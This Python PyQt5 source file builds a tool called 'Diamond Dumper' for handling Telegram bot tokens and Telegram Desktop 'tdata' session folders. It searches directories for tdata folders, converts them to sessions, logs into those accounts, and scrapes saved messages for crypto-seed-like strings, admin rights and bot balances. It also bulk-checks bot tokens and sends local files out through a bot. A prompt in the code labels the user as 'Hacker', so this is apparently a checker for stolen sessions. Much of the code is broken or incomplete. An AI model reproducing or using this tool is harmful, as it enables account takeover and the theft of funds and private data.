import json
import os
import re
import random
import string
import sys
import webbrowser
import requests
import datetime
from PyQt5 import QtCore, QtGui, QtWidgets, uic
from PyQt5.QtCore import QUrl, Qt, QTimer, pyqtSignal, pyqtSlot, QThread, QThreadPool, QBasicTimer, QTimerEvent, QMessageLogContext, QtMsgType, QRect, QEventLoop, QDateTime
from PyQt5.QtWidgets import QApplication, QTabWidget, QScrollArea, QLineEdit, QHBoxLayout, QShortcut, QMainWindow, QListWidget, QDockWidget, QPlainTextEdit, QLCDNumber, QWidget, QVBoxLayout, QTextBrowser, QFileDialog, QTextEdit, QComboBox, QPushButton, QMessageBox, QFrame, QInputDialog, QLabel, QCheckBox, QScrollBar, QDialogButtonBox, QDialog, QGridLayout, QMenu, QAction, QTabBar, QTableWidgetItem, QTreeWidgetItem
import sqlite3
import telebot
from telethon import TelegramClient, events
from telethon.tl.functions.messages import GetMessagesRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.types import MessageService, MessageEmpty
from telethon.tl.types import PeerUser, PeerChat
from telethon.errors.rpcerrorlist import AccessTokenExpiredError, RpcCallFailError
from telethon.errors import SessionPasswordNeededError
from PyQt5.QtCore import QCoreApplication
from telethon.tl.types import MessageMediaGeo, MessageMediaPhoto, MessageMediaDocument, MessageMediaContact
from telethon.tl.types import DocumentAttributeFilename, DocumentAttributeAudio, DocumentAttributeVideo, MessageActionChatEditPhoto
import json
import asyncio
import socks
import shutil
import argparse
from bot import launch_bot, list_tokens
import subprocess
import threading
import requests
from getpass import getpass
from loguru import logger
from os import walk, path, system
from convert_tdata import convert_tdata
from checker import check_sess
from xuy import Result
from typing import List
from results import saver
from secrets import token_hex
from subprocess import check_output
from cryptography.fernet import Fernet
from sys import exit
from json import dumps
from aiohttp import ClientSession

from colorama import Fore, Style

def colorama_to_html(text):
    text = text.replace(Fore.RED, '<span style="color:red;">')
    text = text.replace(Fore.GREEN, '<span style="color:green;">')
    text = text.replace(Fore.YELLOW, '<span style="color:yellow;">')
    text = text.replace(Fore.BLUE, '<span style="color:blue;">')
    text = text.replace(Fore.MAGENTA, '<span style="color:magenta;">')
    text = text.replace(Fore.CYAN, '<span style="color:cyan;">')
    text = text.replace(Fore.WHITE, '<span style="color:white;">')
    text = text.replace(Style.RESET_ALL, '</span>')
    return text











print("Current working directory:", os.getcwd())

API_ID = '24372225'
API_HASH = '78721235ee31d1a1699290cb7535804e'
HISTORY_DUMP_STEP = 200
LOOKAHEAD_STEP_COUNT = 0
all_chats = {}
all_users = {}
messages_by_chat = {}
base_path = ''



class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        uic.loadUi('dumper.ui', self)
        self.TOKEN_COLUMN = 1
        self.NAME_COLUMN = 2
        self.STATUS_COLUMN = 4
        self.ESTIMATED_TIME_PER_TOKEN = 2 
        self.dumpDocument_button.clicked.connect(self.sendDocument_function)
        self.dumpMessage_button.clicked.connect(self.initiate_dumpMessages)
        self.start_button.clicked.connect(self.start_function)
        self.stop_button.clicked.connect(self.stop_function)
        self.dumpPhoto_button.clicked.connect(self.dumpPhoto_function)
        self.submit_single_token_button.clicked.connect(self.checkTelegramBotStatus)
        self.console_text_response_button.clicked.connect(self.handleUserResponse)
        self.load_database_button.clicked.connect(self.openDatabaseFileDialog)
        self.import_bulk_button.clicked.connect(self.importBulkTokens)
        self.sync_button.clicked.connect(self.launch_bot)
        remove_offline_tokens_signal = pyqtSignal()  # Define a signal
        self.tableWidget.setColumnCount(6)
        self.tableWidget.setHorizontalHeaderLabels([
            "Date", "Token", "Bot Name", "Username",
            "Status", "Dumped"
        ])
        self.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self.showContextMenu)
        self.loadBotsFromDatabase()
        self.displayStatsAndCounts()
        self.sync_button.clicked.connect(self.launch_bot)
        app.aboutToQuit.connect(self.saveTokensOnQuit)
        self.tdata_contextMenu = QtWidgets.QMenu(self.tdata_treeWidget)
        self.token_dumper_tab = QtWidgets.QWidget()
        self.load_tdata_directory_button.clicked.connect(self.loadTdataDirectory)
        self.client = None
        self.dialog = None
        self.progressBar.setValue(0)
        self.progressBar.setMaximum(100)
        self.setup_connection()
        self.timer = QTimer(self)
        self.start_tdata_checker_button.clicked.connect(self.start_function)
        self.Start_commandLinkButton.clicked.connect(self.start_function)
        self.saveUser_button.clicked.connect(self.saveUser_function)
        self.saveChat_button.clicked.connect(self.saveChat_function)
        self.saveMedia_photo_button.clicked.connect(self.saveMediaphoto_function)
        self.saveMedia_button.clicked.connect(self.saveMedia_function)
        self.generate_button.clicked.connect(self.generate_function)
        self.live_session_button.clicked.connect(self.live_session_function)
        
        
    def checkSession(self):
        tdata_directory_path = self.tdata_directory_path_text_edit.text()
        valid_sessions = check_telegram_session(tdata_directory_path)
        if valid_sessions:
            self.tdata_console_textedit.append("Valid sessions: " + ", ".join(valid_sessions))
        else:
            self.tdata_console_textedit.append("No valid sessions found.")



            
    def live_session_function(self, tdata_directory_path, tdata_console_textedit):
        root_directory = os.path.dirname(os.path.abspath(__file__))
        root_tdata_path = os.path.join(root_directory, "Tdata")
        self.tdata_manager_tab.tdata_console_textedit.append("Starting to copy Tdata contents...")
        if not os.path.exists(root_tdata_path):
            os.makedirs(root_tdata_path)
            self.tdata_manager_tab.tdata_console_textedit.append(f"Created root Tdata directory at: {root_tdata_path}")
        else:
            self.tdata_manager_tab.tdata_console_textedit.append(f"Root Tdata directory already exists at: {root_tdata_path}")
        for folder_name in os.listdir(tdata_directory_path):
            folder_path = os.path.join(tdata_directory_path, folder_name)
        
            if os.path.isdir(folder_path):
                destination_path = os.path.join(root_tdata_path, folder_name)
                self.tdata_manager_tab.tdata_console_textedit.append(f"Copying contents of folder: {folder_name}")
                try:
                    shutil.copytree(folder_path, destination_path)
                    self.tdata_manager_tab.tdata_console_textedit.append(f"Successfully copied {folder_name} to {destination_path}")
                except Exception as e:
                    self.tdata_manager_tab.tdata_console_textedit.append(f"Error copying {folder_name}: {str(e)}")
            else:
                self.tdata_manager_tab.tdata_console_textedit.append(f"Skipping {folder_name}, not a directory.")
        self.tdata_manager_tab.tdata_console_textedit.append("Finished copying Tdata contents.")
        
    def generate_function(self):
        self.tdata_treeWidget.clear()
        self.tdata_treeWidget.setColumnCount(12)
        self.tdata_treeWidget.setHeaderLabels([
            "Date", "Root Folder", "User ID", "Username", "Phone Number",
            "Groups", "Channels", "Admin Rights", "Spam Blocked",
            "Crypto Wallet", "Owned Groups", "Owned Bots"
        ])
    
        items_data = [
            ["07/26/2024", "US_35.212.166.53WWQJLLS81YSR8GNNM", "54832754", "@TeamCashOut", "+1523918241",
            "184", "42", "✅ 10", "❌", "Enabled", "10 Ownerships", "7 Bots"],
        ]
    
        for data in items_data:
            QTreeWidgetItem(self.tdata_treeWidget, data)
    
        self.tdata_treeWidget.expandAll()

    def initiate_search(self):
        self.update_tdata_console("Search will begin in 5 seconds...")
        QTimer.singleShot(5000, self.start_function)  # 5000 ms = 5 seconds

    def start_function(self):
        directory_path = self.tdata_directory_path_text_edit.toPlainText()
        if not directory_path:
            self.update_tdata_console("Error: Please select a directory first.")
            return
        self.update_tdata_console(f"Searching in: {directory_path}")
        self.progressBar.setValue(0)
        self.timer.start(100)  # Update every 100 ms
        tdata_count = 0
        total_dirs = sum([len(dirs) for _, dirs, _ in os.walk(directory_path)])
        processed_dirs = 0
    
        for root, dirs, files in os.walk(directory_path):
            for dir_name in dirs:
                if dir_name.lower() in ['tdata', 'profile_1']:
                    tdata_count += 1
                    self.update_tdata_console(f"Found: {os.path.join(root, dir_name)}")
                processed_dirs += 1
                self.progressBar.setValue(int((processed_dirs / total_dirs) * 100))
                QApplication.processEvents()  # Allow GUI to update
        self.tdata_total_lcdNumber.display(tdata_count)
        self.update_tdata_console(f"Search complete. Found {tdata_count} Tdata/Profile_1 folders.")
        self.timer.stop()
        self.progressBar.setValue(100)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        main_py_path = os.path.join(script_dir, 'tdata_checker_product', 'main.py')
        subprocess.Popen(['python', main_py_path, directory_path])
    

    async def check(self, tdata_path: str, sess: str, sem: asyncio.Semaphore) -> Result:
        res = Result(tdata_path)
        try:
            client = TelegramClient(StringSession(sess), API_ID, API_HASH)
            await client.connect()
            me = await client.get_me()
            mnemonics = set()
            try:
                async for m in client.iter_messages('me'):
                    if not isinstance(m.message, str):
                        continue
                    for mn in re.findall(r'\b[A-HJ-NP-Z2-9]{24}\b', m.message):
                        logger.success(mn)
                        mnemonics.add(mn)
            except:
                pass
            logger.info(f'{me.phone} checked')
            res.seeds = mnemonics
            res.is_valid = True
            res.phone = me.phone
        except Exception as e:
            logger.error(f'{e}')
            return res

        try:
            for dlg in await client.get_dialogs():
                if isinstance(dlg.entity, (Chat, Channel)) and dlg.entity.admin_rights:
                    try:
                        megagroup = dlg.entity.megagroup
                    except:
                        megagroup = False
                    res.admin_rights.append(AdminRight(
                        megagroup,
                        dlg.entity.participants_count,
                        dlg.entity.title
                    ))
                    dlg_type = 'Group' if megagroup else 'Channel'
                    logger.success(f'{dlg_type} | {dlg.entity.title} | {dlg.entity.participants_count} subscribers')
        except Exception as e:
            logger.error(e)
        try:
            for bot in bots:
                m_count = 0
                async for m in client.iter_messages(bot.peer):
                    m_count += 1
                    r = bot.check(m.message)
                    if r is not None:
                        res.bots[bot] = BotBalance(bot, r)
                        logger.success(f'Balance {r} in {bot.peer}')
                        break
                if bot not in res.bots and m_count > 0:
                    res.bots[bot] = BotBalance(bot, None)
        except Exception as e:
            logger.error(e)
        await self.saver.save(res)
        return res

    async def check_sess(self, tdata_path: str, sess: str, sem: asyncio.Semaphore) -> Result:
        async with sem:
            for attempt in range(3):
                try:
                    return await asyncio.wait_for(self.check(tdata_path, sess, sem), timeout=5.0)
                except asyncio.TimeoutError:
                    await asyncio.sleep(3)
                    continue
            else:
                logger.error('Timeout')
                return Result(tdata_path)

    async def process_tdata(self, directory_path: str):
        sem = asyncio.Semaphore(threads)

        logger.info('Create folders for check results')
        save_path = await self.saver.create_all()

        logger.info(f'Starting looking for folders called "tdata" in {directory_path}')
        tdatas = []
        for dirpath, dirnames, filenames in os.walk(directory_path):
            folder_name = os.path.split(dirpath)[1]
            if folder_name == 'tdata' or 'Profile_' in folder_name:
                tdatas.append(dirpath)

        logger.info(f'Found {len(tdatas)} tdata, start converting to sessions')
        string_sessions = {}
        for tdata in tdatas:
            try:
                for s in convert_tdata(tdata):
                    string_sessions[s] = tdata
            except Exception:
                continue

        logger.info(f'Found {len(string_sessions)} sessions, starting check')
        tasks = [self.check_sess(p, s, sem) for s, p in string_sessions.items()]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        self.tdata_console_textedit.clear()
        for result in results:
            self.tdata_console_textedit.append(str(result))

    async def start_process_tdata(self, directory_path: str):
        self.update_tdata_console("Process tdata will begin in 5 seconds...")
        await asyncio.sleep(5)
        await self.process_tdata(directory_path)

    def update_progress_bar(self):
        current_value = self.progressBar.value()
        if current_value < 100:
            self.progressBar.setValue(current_value + 1)

    def update_tdata_console(self, message):
        self.tdata_console_textedit.append(message)
        self.tdata_console_textedit.verticalScrollBar().setValue(
            self.tdata_console_textedit.verticalScrollBar().maximum())


    def loadTdataDirectory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            self.tdata_directory_path_text_edit.setText(directory)


    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)

    def launch_bot(self):
        TOKEN = self.bot_manager_text_input.toPlainText()

        if not TOKEN:
            error_msg = "Bot token is not defined. Please submit a bot token to manage."
            self.displayErrorMessage(error_msg)
            return

        user_id = self.telegram_chat_id_text_input.toPlainText()
        result = launch_bot(TOKEN, user_id)

        if result.startswith("Failed"):
            self.displayErrorMessage(result)
        else:
            self.displaySuccessMessage(result)

    def sendDocument_function(self):
        try:
            TOKEN = self.bot_manager_text_input.toPlainText()
            chat_id = self.telegram_chat_id_text_input.toPlainText()

            script_dir = os.path.dirname(os.path.realpath(__file__))
            documents_dir = os.path.join(script_dir, "Documents")

            bot = telebot.TeleBot(TOKEN)

            for filename in os.listdir(documents_dir):
                file_path = os.path.join(documents_dir, filename)

                if os.path.isfile(file_path):
                    with open(file_path, "rb") as document:
                        bot.send_document(chat_id, document)

            self.displaySuccessMessage("Document sent successfully.")

        except telebot.apihelper.ApiException as e:
            self.displayErrorMessage(f"Failed to send the document. Error: {str(e)}")

    def sendMessage_function(self):
        try:
            TOKEN = self.bot_manager_text_input.toPlainText()
            message = self.console_text_response_input.toPlainText()
            bot = telebot.TeleBot(TOKEN)
            all_users = retrieve_all_users()
    
            for user in all_users:
                chat_id = user.chat_id
                bot.send_message(chat_id, message)
    
            self.console_text_edit_2.append(f"Message sent successfully to all subscribed users.")
    
        except telebot.TeleBotException:
            self.console_text_edit_2.append("Failed to send the message. Please try again.")

    async def dumpPhoto_function(bot, user):
        user_id = str(user.id)
        user_dir = os.path.join(base_path, user_id)
        result = await safe_api_request(bot(GetUserPhotosRequest(user_id=user.id,offset=0,max_id=0,limit=100)), 'get user photos')
        if not result:
            return
        for photo in result.photos:
            print(f"Saving photo {photo.id}...")
            await safe_api_request(bot.download_file(photo, os.path.join(user_dir, f'{photo.id}.jpg')), 'download user photo')
        asyncio.run(dumpPhoto_function(bot, user))

    def stop_function(self):
        try:
            process_id = "your_process_id_here"
            os.kill(process_id, signal.SIGTERM)
            self.displaySuccessMessage("Process stopped successfully.")
        except OSError:
            self.displayErrorMessage("Failed to stop the process.")


    def displayJSON(self, json_data):
        formatted_json = json.dumps(json_data, indent=4, ensure_ascii=False)
        self.console_text_edit_2.append(formatted_json)

    def handleUserResponse(self):
        user_response = self.console_text_response_input.toPlainText()
        self.console_text_edit_2.append(f"Hacker's response: {user_response}")

        if user_response.upper() == 'Y':
            token = self.single_token_submittion_text_input.toPlainText()
            additional_argument = None  # Replace with the additional argument you want to pass if needed
            self.addToDatabase(token, additional_argument)

    def importBulkTokens(self):
        file_path = self.import_bulk_file_path_text_edit.toPlainText()
        added_tokens = set()  # Keep track of added tokens to avoid duplicates
    
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()
    
                for line in lines:
                    token = line.strip()
                    response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
                    json_data = response.json()
                    if response.status_code == 200 and "result" in json_data:
                        bot_name = json_data["result"].get("username")
                        username = json_data["result"].get("username")
                        if token not in added_tokens:
                            self.addToDatabase(token, bot_name, username)
                            added_tokens.add(token)
                            self.displaySuccessMessage(f"Token '{token}' imported successfully.")
                        else:
                            self.displayErrorMessage(f"Duplicate token '{token}' found. Skipping.")
                    else:
                        self.displayErrorMessage(f"Invalid token '{token}' found. Skipping.")
                    QtWidgets.QApplication.processEvents()  # Process events to prevent freezing
        except FileNotFoundError:
            self.displayErrorMessage(f"File not found: {file_path}")
        except OSError:
            self.displayErrorMessage(f"Error reading file: {file_path}")

    
    def saveBotToDatabase(self, token, bot_name, username, status, submission_date, dumped):
        connection = sqlite3.connect("data.db")
        cursor = connection.cursor()
    
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bots 
            (token TEXT, bot_name TEXT, username TEXT, status TEXT, 
            submission_date TEXT, last_checked_date TEXT, last_dumped_date TEXT)
        """)
    
        cursor.execute("""
            INSERT INTO bots 
            (token, bot_name, username, status, submission_date, last_checked_date, last_dumped_date) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (token, bot_name, username, status, submission_date, "", ""))
    
        connection.commit()
        cursor.close()
        connection.close()


    def isTokenDuplicate(self, token):
        for row in range(self.tableWidget.rowCount()):
            existing_token = self.tableWidget.item(row, 1).text()
            if existing_token == token:
                return True
        return False

    def checkTelegramBotStatus(self):
        token = self.single_token_submittion_text_input.toPlainText()
        url = f"https://api.telegram.org/bot{token}/getMe"
        try:
            response = requests.get(url)
            response.raise_for_status()
    
            if response.status_code == 200:
                self.displaySuccessMessage("Telegram Bot is online!")
                json_data = json.loads(response.content)
                bot_name = json_data["result"]["username"]
                username = json_data["result"]["username"]
                if self.isTokenDuplicate(token):
                    self.displayErrorMessage("Duplicate token. Please provide a different token.")
                else:
                    reply = QMessageBox.question(self, "Save Token", "Do you want to save the token to the database?", QMessageBox.Yes | QMessageBox.No)
                    if reply == QMessageBox.Yes:
                        self.addToDatabase(token, bot_name, username)
                    else:
                        self.displaySuccessMessage("Token not saved to the database.")
            else:
                self.displayErrorMessage("Invalid token. Please provide a valid token.")
        except requests.exceptions.RequestException as e:
            error_msg = f"An error occurred during the request:\n{str(e)}"
            self.displayErrorMessage(error_msg)
    
    # Add the token to the database
    def addToDatabase(self, token, bot_name=None, username=None):
        status = "Online"
        submission_date = datetime.date.today().strftime('%Y-%m-%d')
        dumped = ""  # Initialize as empty string
    
        row_count = self.tableWidget.rowCount()
        self.tableWidget.insertRow(row_count)
        
        self.tableWidget.setItem(row_count, 0, QTableWidgetItem(submission_date))
        self.tableWidget.setItem(row_count, 1, QTableWidgetItem(token or ""))
        self.tableWidget.setItem(row_count, 2, QTableWidgetItem(bot_name or ""))
        self.tableWidget.setItem(row_count, 3, QTableWidgetItem(username or ""))
        self.tableWidget.setItem(row_count, 4, QTableWidgetItem(status))
        self.tableWidget.setItem(row_count, 5, QTableWidgetItem(dumped))
    
        self.loadBotsFromDatabase()
    
    def loadBotsFromDatabase(self):
        connection = sqlite3.connect("data.db")
        cursor = connection.cursor()
    
        cursor.execute("SELECT * FROM bots")
        bot_records = cursor.fetchall()
    
        self.tableWidget.setRowCount(0)  # Clear existing rows
        for i, bot in enumerate(bot_records):
            self.tableWidget.insertRow(i)
            self.tableWidget.setItem(i, 0, QTableWidgetItem(bot[4]))  # submission_date
            self.tableWidget.setItem(i, 1, QTableWidgetItem(bot[0]))  # token
            self.tableWidget.setItem(i, 2, QTableWidgetItem(bot[1]))  # bot_name
            self.tableWidget.setItem(i, 3, QTableWidgetItem(bot[2]))  # username
            self.tableWidget.setItem(i, 4, QTableWidgetItem(bot[3]))  # status
            self.tableWidget.setItem(i, 5, QTableWidgetItem(bot[6]))  # last_dumped_date
    
        cursor.close()
        connection.close()

    def openDatabaseFileDialog(self):
        file_dialog = QFileDialog()
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        file_dialog.setNameFilter("Database files (*.db)")
        file_dialog.setDirectory(os.getcwd())

        if file_dialog.exec_():
            file_path = file_dialog.selectedFiles()[0]
            self.loadDatabaseFile(file_path)

    def loadDatabaseFile(self, file_path):
        connection = sqlite3.connect(file_path)
        cursor = connection.cursor()

        cursor.execute("SELECT * FROM bots")
        bot_records = cursor.fetchall()

        self.tableWidget.setRowCount(0)
        for i, bot in enumerate(bot_records):
            self.tableWidget.insertRow(i)
            self.tableWidget.setItem(i, 0, QTableWidgetItem(str(i + 1)))
            self.tableWidget.setItem(i, 0, QTableWidgetItem(bot[0]))
            self.tableWidget.setItem(i, 1, QTableWidgetItem(bot[1]))
            self.tableWidget.setItem(i, 2, QTableWidgetItem(bot[2]))
            self.tableWidget.setItem(i, 3, QTableWidgetItem(bot[3]))
            self.tableWidget.setItem(i, 4, QTableWidgetItem(bot[4]))
            self.tableWidget.setItem(i, 5, QTableWidgetItem(bot[5]))
            self.tableWidget.setItem(i, 6, QTableWidgetItem(bot[6]))

        cursor.close()
        connection.close()

    def displayStatsAndCounts(self):
        connection = sqlite3.connect("data.db")
        cursor = connection.cursor()

        cursor.execute("SELECT COUNT(*) FROM bots")
        total_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM bots WHERE status = 'Online'")
        online_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM bots WHERE status = 'Offline'")
        offline_bots_count = cursor.fetchone()[0]

        today_date = datetime.date.today().strftime('%Y-%m-%d')
        cursor.execute("SELECT COUNT(*) FROM bots WHERE last_checked_date = ?", (today_date,))
        today_checked_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM bots WHERE last_dumped_date = ?", (today_date,))
        today_dumped_bots_count = cursor.fetchone()[0]

        stats_text = f"Total Bots count: {total_bots_count}\n"
        stats_text += f"Online Bots count: {online_bots_count}\n"
        stats_text += f"Offline Bots count: {offline_bots_count}\n"
        stats_text += f"Bots Checked today: {today_checked_bots_count}\n"
        stats_text += f"Bots Dumped today: {today_dumped_bots_count}\n"

        cursor.close()
        connection.close()




######--------------------------------------------------------------##########
######--------------- CONTEXT MENU OPTIONS --------------------##########

    def showContextMenu(self, point):
        menu = QtWidgets.QMenu(self)
        
        tdata_manager_tab_action = menu.addAction("Token Manager")
        session_manager_action = menu.addAction("Sesssion Manager")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == tdata_manager_tab_action:
            self.token_manager_ContextMenu(point)
        elif action == session_manager_action:
            self.session_manager_TabContextMenu(point)
    
    def token_manager_ContextMenu(self, point):
        menu = QtWidgets.QMenu(self)
        
        refresh_action = menu.addAction("Refresh Token")
        remove_action = menu.addAction("Remove Token")
        view_action = menu.addAction("View Token")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == refresh_action:
            self.refreshToken()
        elif action == remove_action:
            self.removeToken()
        elif action == view_action:
            self.viewToken()


######--------------------------------------------------------------##########
######--------------- SESSIONS/TOKENS FUNCTIONS --------------------##########


    def session_manager_TabContextMenu(self, point):
        if self.tableWidget.hasFocus() or self.tableWidget.selectedItems():
            # Show an error dialog
            error_dialog = QtWidgets.QMessageBox()
            error_dialog.setIcon(QtWidgets.QMessageBox.Warning)
            error_dialog.setText("Error: You cannot use the Session Manager context menu while you are on the Token Manager Table. Switch Tabs to the Session Manager Tab")
            error_dialog.setWindowTitle("Diamond Dumper: Function Error Window")
            error_dialog.setStandardButtons(QtWidgets.QMessageBox.Ok)
            error_dialog.exec_()
            return  # Exit the function early
    
        menu = QtWidgets.QMenu(self)
        
        open_session_action = menu.addAction("Open Session Directory")
        check_session_action = menu.addAction("Check Session")
        test_session_action = menu.addAction("Test Session Live")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == open_session_action:
            self.openSessionDirectory()
        elif action == check_session_action:
            self.checkSession()
        elif action == test_session_action:
            self.testSessionLive()




    def openSessionDirectory(self):
        selected_items = self.tdata_treeWidget.selectedItems()
        if len(selected_items) == 0:
            return
        folder_path = selected_items[0].text(0)
        if os.path.exists(folder_path):
            os.startfile(folder_path)
    

    def check_telegram_session(tdata_path):
        valid_sessions = []
        if not os.path.exists(tdata_path):
            print(f"Error: The folder {tdata_path} does not exist.")
            return
        for filename in os.listdir(tdata_path):
            file_path = os.path.join(tdata_path, filename)
            if os.path.isfile(file_path) and filename.endswith('.session'):
                try:
                    client = TelegramClient(file_path, API_ID, API_HASH)
                    with client:
                        me = client.get_me()
                        if me:
                            print(f"Valid session found: {filename}")
                            valid_sessions.append(filename)
                        else:
                            print(f"Invalid session: {filename}")
                except Exception as e:
                    print(f"Error checking session {filename}: {str(e)}")
        return valid_sessions
    
    def select_directory():
        directory_path = filedialog.askdirectory()
        if directory_path:
            path_entry.delete(0, 'end')  # Clear the entry field
            path_entry.insert(0, directory_path)  # Insert the selected path


    def check_sessions():
        tdata_path = path_entry.get()
        valid_sessions = check_telegram_session(tdata_path)
        if valid_sessions:
            print("Valid sessions:", valid_sessions)
        else:
            print("No valid sessions found.")


    def testSessionLive(self):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        root_folder = "Root Folder"
        sub_folder_name = "Tdata"  # or "Profile_1"
    
        selected_items = self.tableWidget.selectedItems()
        if len(selected_items) == 0:
            return
    
        file_directory_path = selected_items[0].text()
    
        sub_directory_path = os.path.join(base_dir, root_folder, sub_folder_name)
        tdata_folder = os.path.join(file_directory_path, "tdata")
        if os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        shutil.copytree(sub_directory_path, tdata_folder)
        response_message = f"Folder contents copied from {sub_directory_path} to {tdata_folder}"
        self.tdata_manager_tab.tdata_console_textedit.append(response_message)
        telegram_exe_path = os.path.join(file_directory_path, "Telegram.exe")
        subprocess.Popen(telegram_exe_path)
        function_call_message = f"Launched Telegram.exe from {telegram_exe_path}"
        self.tdata_manager_tab.tdata_console_textedit.append(function_call_message)
    

    def refreshToken(self):
        selected_rows = set(item.row() for item in self.tableWidget.selectedItems())
        all_rows = set(range(self.tableWidget.rowCount()))

        if selected_rows == all_rows:
            self.refreshAllTokens()
        else:
            self.refreshSelectedTokens(selected_rows)

    def refreshAllTokens(self):
        total_tokens = self.tableWidget.rowCount()
        estimated_time = total_tokens * self.ESTIMATED_TIME_PER_TOKEN

        intro_message = (
            f"You Selected {total_tokens} Tokens....\n"
            f"Starting to Batch Refresh Each Token......\n"
            f"Process will take approximately {estimated_time} seconds\n"
            "--------------------------------------------\n"
        )
        self.console_text_edit_2.append(intro_message)  # Use the typing effect
        QCoreApplication.processEvents()

        for row in range(total_tokens):
            self.refreshSingleToken(row)
            QCoreApplication.processEvents()

        self.typeText("--------------------------------------------\n"
                    "All tokens have been refreshed.")
        self.askToRemoveOfflineTokens()

    def refreshSelectedTokens(self, selected_rows):
        total_tokens = len(selected_rows)
        estimated_time = total_tokens * self.ESTIMATED_TIME_PER_TOKEN

        intro_message = (
            f"You Selected {total_tokens} Tokens....\n"
            f"Starting to Batch Refresh Selected Tokens......\n"
            f"Process will take approximately {estimated_time} seconds\n"
            "--------------------------------------------\n"
        )
        self.typeText(intro_message)  # Use the typing effect
        QCoreApplication.processEvents()

        for row in selected_rows:
            self.refreshSingleToken(row)
            QCoreApplication.processEvents()

        self.console_text_edit_2.append("--------------------------------------------\n"
                    "All selected tokens have been refreshed.")
        self.askToRemoveOfflineTokens()

    def refreshSingleToken(self, row):
        token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
        bot_name = self.tableWidget.item(row, self.NAME_COLUMN).text()

        refresh_url = f"https://api.telegram.org/bot{token}/getUpdates"

        try:
            response = requests.get(refresh_url, timeout=10)
            response.raise_for_status()
            
            message = f"{bot_name} Token refreshed successfully."
            online_status = "Online"
        except requests.RequestException as e:
            message = f"Failed to refresh the token for the bot {bot_name}. Error: {str(e)}"
            online_status = "Offline"

        status_item = QTableWidgetItem(online_status)
        self.tableWidget.setItem(row, self.STATUS_COLUMN, status_item)
        
        # Display the response in console_text_edit_2
        self.console_text_edit_2.append(message)

        # Update the UI
        QCoreApplication.processEvents()

    def typeText(self, text, typing_speed=50):  # typing_speed in milliseconds
        html_text = colorama_to_html(text)  # Convert colorama styles to HTML
        self.console_text_edit_2.clear()  # Clear previous text if needed
        self.console_text_edit_2.setEnabled(False)  # Disable input during typing

        timer = QTimer()
        index = 0



    def askToRemoveOfflineTokens(self):
        self.console_text_edit_2.append("\nWould you like to automatically remove the offline tokens from the database? (Y/N)")
        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )
        self.console_text_response_input.setEnabled(True)
        self.console_text_response_button.setEnabled(True)
        self.console_text_response_input.setFocus()

    def handleRemoveOfflineTokens(self):
        response = self.console_text_response_input.text().strip().lower()
        self.console_text_response_input.clear()
        self.console_text_response_input.setEnabled(False)
        self.console_text_response_button.setEnabled(False)

        if response == 'y':
            self.removeOfflineTokens()
        else:
            self.console_text_edit_2.append("Offline tokens will not be removed.")

        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )

    def removeOfflineTokens(self):
        offline_tokens = []
        for row in range(self.tableWidget.rowCount()):
            status = self.tableWidget.item(row, self.STATUS_COLUMN).text()
            if status.lower() == 'offline':
                token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
                offline_tokens.append(token)

        if offline_tokens:
            self.console_text_edit_2.append(f"Removing {len(offline_tokens)} offline tokens from the database...")
            self.console_text_edit_2.append("Offline tokens have been removed.")
        else:
            self.console_text_edit_2.append("No offline tokens found.")

        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )

    def change_token_status_to_offline(token):
        # Connect to the database
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE tokens SET status = 'Offline' WHERE token = ?", (token,))
    
        conn.commit()
        conn.close()






    def viewToken(self):
        selected_rows = self.tableWidget.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
    
        if row != -1:
            token = self.tableWidget.item(row, 1).text()
            QtWidgets.QMessageBox.information(self, "View Token", f"Token: {token}")



    def removeSelectedRow(self):
        selected_rows = self.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
        if row != -1:
            self.removeRow(row)


    def saveTokensOnQuit(self):
        reply = QtWidgets.QMessageBox.question(self, "Save Tokens", "Do you want to save your tokens to the database?", QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
        if reply == QtWidgets.QMessageBox.Yes:
            self.saveTokensToDatabase()

    # Add the saveTokensToDatabase function
    def saveTokensToDatabase(self):
        connection = sqlite3.connect("data.db")
        cursor = connection.cursor()

        # Clear the existing tokens in the 'bots' table
        cursor.execute("DELETE FROM bots")

        # Iterate through the tableWidget and save each token to the database
        for row in range(self.tableWidget.rowCount()):
            token = self.tableWidget.item(row, 1).text()
            bot_name = self.tableWidget.item(row, 2).text()
            username = self.tableWidget.item(row, 3).text()
            status = self.tableWidget.item(row, 4).text()
            submission_date = self.tableWidget.item(row, 5).text()
            last_checked_date = self.tableWidget.item(row, 6).text()
            last_dumped_date = self.tableWidget.item(row, 7).text()

            # Execute an INSERT query to save the token to the 'bots' table
